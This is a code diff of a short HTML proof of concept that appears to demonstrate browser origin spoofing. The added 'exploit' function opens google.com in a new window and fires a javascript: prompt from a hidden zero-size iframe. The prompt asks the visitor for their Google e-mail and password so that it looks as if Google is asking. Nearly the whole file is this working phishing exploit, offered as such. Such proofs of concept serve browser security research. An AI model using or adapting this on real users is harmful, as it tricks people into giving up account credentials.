@@ -1,15 +1,26 @@
 
+<html>
+  <body>
 
-<script>
-  function next() {
-	  	   setTimeout(function(){w.location.replace('https://www.google.com');}, 5000);
+    <script>
 
-        }
+    function exploit() {
 
-  function f() {
-    w = window.open("https://jigsaw.w3.org/HTTP/Basic/");
-    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
-  }
-</script>
+      window.open("https://www.google.com");
 
-<a href="#" onclick="f()">Click here</a>
+      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
+    
+    }
+    
+    </script>
+
+    <br><br><br><br>
+
+    <a href="#" onclick="exploit();">
+      <center><h1>Click here to go to Google.com</h1></center>
+    </a>
+
+    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
+
+  </body>
+</html>
